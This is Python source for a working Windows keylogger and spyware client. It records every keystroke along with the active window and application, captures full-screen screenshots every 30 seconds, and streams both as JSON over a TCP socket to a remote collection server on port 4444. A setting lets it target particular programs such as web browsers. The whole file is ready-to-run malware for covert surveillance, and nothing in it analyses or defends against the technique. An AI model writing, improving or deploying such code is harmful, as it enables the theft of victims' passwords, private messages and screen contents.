

import os
import getpass
import pyperclip
import psutil
import platform
import socket
import requests
import time
import threading
import json
import base64
import logging
from datetime import datetime
from pynput import keyboard
from mss import mss

# Windows specific imports
import win32gui
import win32process

# --- Configuration ---
SERVER_HOST = '192.168.100.9'  # Change this to the server's IP address
SERVER_PORT = 4444
# Optional: Restrict logging to specific applications
# TARGET_APPS = ["chrome.exe", "firefox.exe", "notepad.exe"] 
TARGET_APPS = [] # Empty list means log all apps

# --- Logging ---
LOG_FILE = os.path.expanduser("~/keylogger.log")
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# --- Connection ---
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect_to_server():
    while True:
        try:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            logging.info("Connected to server.")
            print("[+] Connected to server.")
            break
        except ConnectionRefusedError:
            logging.warning("Server not found. Retrying in 5 seconds...")
            print("[-] Server not found. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            logging.error(f"Error connecting to server: {e}")
            print(f"[!] Error connecting to server: {e}")
            time.sleep(5)

connect_to_server() # Initial connection attempt

def send_data(data):
    try:
        client_socket.sendall(json.dumps(data).encode('utf-8') + b'\n')
    except (ConnectionResetError, BrokenPipeError):
        logging.warning("Connection to server lost. Reconnecting...")
        print("[-] Connection to server lost. Reconnecting...")
        connect_to_server()
    except Exception as e:
        logging.error(f"Error sending data: {e}")
        print(f"[!] Error sending data: {e}")

# --- Data Collection ---

def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(hwnd)[1]
        proc = psutil.Process(pid)
        exe_name = proc.name()
        window_title = win32gui.GetWindowText(hwnd)
        return window_title, exe_name
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        return "UNKNOWN", "UNKNOWN"
    except Exception as e:
        logging.error(f"Error getting active window info: {e}")
        return "UNKNOWN", "UNKNOWN"

def log_keystroke(key):
    window_title, exe_name = get_active_window_info()

    if TARGET_APPS and exe_name not in TARGET_APPS:
        return # Skip logging if the app is not in the target list

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    key_str = format_key(key)

    data = {
        'type': 'keystroke',
        'timestamp': timestamp,
        'key': key_str,
        'window_title': window_title,
        'application': exe_name,
    }
    send_data(data)

def capture_screenshot():
    while True:
        try:
            with mss() as sct:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                sct_img = sct.grab(sct.monitors[1])
                img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                img_base64 = base64.b64encode(img_bytes).decode('utf-8')

                data = {
                    'type': 'screenshot',
                    'timestamp': timestamp,
                    'image': img_base64,
                }
                send_data(data)
        except Exception as e:
            logging.error(f"Error capturing screenshot: {e}")
            print(f"[!] Error capturing screenshot: {e}")
        
        time.sleep(30) # Capture every 30 seconds

def format_key(key):
    if hasattr(key, 'char') and key.char:
        return key.char
    else:
        return str(key)

# --- Main ---
if __name__ == "__main__":
    logging.info("Keylogger started.")
    # Start screenshot capture in a background thread
    screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
    screenshot_thread.start()

    print(f"[+] Keylogger started at {datetime.now()}...")
    print(f"[+] Logging errors to {LOG_FILE}")
    if TARGET_APPS:
        print(f"[+] Logging keystrokes only for: {', '.join(TARGET_APPS)}")
    
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()
